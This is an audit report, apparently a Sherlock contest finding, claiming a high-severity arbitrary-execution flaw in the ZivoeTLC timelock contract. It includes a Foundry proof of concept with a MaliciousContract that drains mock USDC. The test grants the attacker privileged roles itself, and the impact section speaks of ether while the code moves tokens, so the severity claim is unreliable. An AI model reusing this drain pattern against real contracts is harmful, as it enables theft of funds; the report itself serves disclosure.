# [H-1] Arbitrary Execution Vulnerability in ZivoeTLC Contract Allows Attacks to Steal Funds

## Summary
The ZivoeTLC contract contains an arbitrary execution vulnerability that allows an attacker with the necessary roles (e.g., PROPOSER_ROLE and EXECUTOR_ROLE) to propose and execute arbitrary actions, including sending funds to any contract. The vulnerability stems from the lack of proper access controls and validation of proposed actions in the contract.

## Vulnerability Detail

The line with the vulnerability can be found here: 

https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/libraries/ZivoeTLC.sol?plain=1#L383

It is in the function `_execute` between lines #378 - 385

## Code Snippet

The Proof of Code below demonstrates the exploitation of the arbitrary execution vulnerability in the ZivoeTLC contract:

Inside of zivoe-core-foundry, create a new Test folder, inside of the test folder create a mocks folder and inside of the mocks folder create a MockERC20.sol file.

Paste this code into the MockERC20.sol file:
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }
}
```

Create a new ZivoeTLC.t.sol file in the test folder and add the following code.

```javascript 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../src/libraries/ZivoeTLC.sol";
import "../test/mocks/MockERC20.sol";

contract ZivoeTLCTest is Test {
    ZivoeTLC public zivoeTLC;
    address attacker = address(0x1337);

    function setUp() public {
        // Deploy the ZivoeTLC contract
        zivoeTLC = new ZivoeTLC(1 days, new address[](0), new address[](0), address(this));

        // Grant the attacker the TIMELOCK_ADMIN_ROLE
        zivoeTLC.grantRole(zivoeTLC.TIMELOCK_ADMIN_ROLE(), attacker);

        // Grant the attacker the PROPOSER_ROLE and EXECUTOR_ROLE
        zivoeTLC.grantRole(zivoeTLC.PROPOSER_ROLE(), attacker);
        zivoeTLC.grantRole(zivoeTLC.EXECUTOR_ROLE(), attacker);
    }

    function testArbitraryExecute() public {
        // Deploy the mock USDC contract
        MockERC20 mockUSDC = new MockERC20("Mock USDC", "USDC");

        // Mint USDC to the ZivoeTLC contract
        mockUSDC.mint(address(zivoeTLC), 10000000000);

        // Deploy the malicious contract
        MaliciousContract maliciousContract = new MaliciousContract(attacker, mockUSDC);

        // Mock the GBL contract
        MockGBL mockGBL = new MockGBL();
        vm.etch(zivoeTLC.GBL(), address(mockGBL).code);

        vm.startPrank(attacker);

        // Attacker proposes a malicious proposal to approve the malicious contract to spend USDC
        bytes memory approvePayload =
            abi.encodeWithSignature("approve(address,uint256)", address(maliciousContract), 10000000000);
        zivoeTLC.schedule(address(mockUSDC), 0, approvePayload, bytes32(0), bytes32(0), zivoeTLC.getMinDelay());

        // Advance time to make the approval proposal executable
        vm.warp(block.timestamp + zivoeTLC.getMinDelay());

        // Attacker executes the approval proposal
        zivoeTLC.execute(address(mockUSDC), 0, approvePayload, bytes32(0), bytes32(0));

        // Attacker proposes a malicious proposal to send USDC to the malicious contract
        bytes memory transferPayload = abi.encodeWithSignature("receiveUSDC(uint256)", 10000000000);
        zivoeTLC.schedule(
            address(maliciousContract), 0, transferPayload, bytes32(0), bytes32(0), zivoeTLC.getMinDelay()
        );

        // Advance time to make the transfer proposal executable
        vm.warp(block.timestamp + zivoeTLC.getMinDelay());

        // Attacker executes the transfer proposal
        zivoeTLC.execute(address(maliciousContract), 0, transferPayload, bytes32(0), bytes32(0));

        // Attacker calls the withdraw function to transfer the USDC
        maliciousContract.withdrawUSDC();

        vm.stopPrank();

        // Assert that the attacker received the USDC
        assertEq(mockUSDC.balanceOf(attacker), 10000000000);
    }
}

contract MaliciousContract {
    address public attacker;
    ERC20 public usdc;

    constructor(address _attacker, ERC20 _usdc) {
        attacker = _attacker;
        usdc = _usdc;
    }

    function withdrawUSDC() public {
        usdc.transfer(attacker, usdc.balanceOf(address(this)));
    }

    function receiveUSDC(uint256 amount) external {
        usdc.transferFrom(msg.sender, address(this), amount);
    }
}

contract MockGBL {
    function isKeeper(address account) external view returns (bool) {
        return account == 0x0000000000000000000000000000000000001337;
    }
}

```
To run this test, run `$ forge test --mt testArbitraryExecute ` and you will see the the test passes, and the attacker stole all the USDC.

Exploit walkthrough:
Setup:
The test deploys the ZivoeTLC contract and grants the attacker the necessary roles.
It deploys a mock USDC contract and mints USDC tokens to the ZivoeTLC contract.
It deploys a malicious contract (MaliciousContract) controlled by the attacker.


Exploitation:
The attacker proposes a malicious proposal to approve the MaliciousContract to spend USDC tokens on behalf of the ZivoeTLC contract.
The approval proposal is executed after advancing the time to make it executable.
The attacker proposes another malicious proposal to send USDC tokens from the ZivoeTLC contract to the MaliciousContract.
The transfer proposal is executed after advancing the time to make it executable.
The attacker calls the withdrawUSDC function of the MaliciousContract to transfer the USDC tokens to their own address.


Outcome:
The attacker successfully drains all USDC tokens from the ZivoeTLC contract to their own address.
The test asserts that the attacker's balance of USDC tokens is equal to the amount stolen.

## Impact
An attacker with the necessary roles can exploit this vulnerability to drain ether from the ZivoeTLC contract by proposing and executing malicious actions. The attacker can deploy a malicious contract that can receive ether without reverting and then withdraw the funds to their own address. This can result in significant financial loss for the contract and its users.

Manual Review

## Recommendation
To mitigate this vulnerability, the following measures should be implemented in the ZivoeTLC contract:

1. Implement strict access controls to ensure that only authorized entities can propose and execute actions.
2. Validate the proposed actions to ensure they are safe and align with the intended behavior of the contract.
3. Restrict the allowed target contracts and functions that can be called through the _execute() function.
4. Set appropriate limits on the ether amounts that can be proposed and executed to prevent excessive fund transfers.
5. Ensure that an arbitrary user cannot withdraw unauthorized funds.
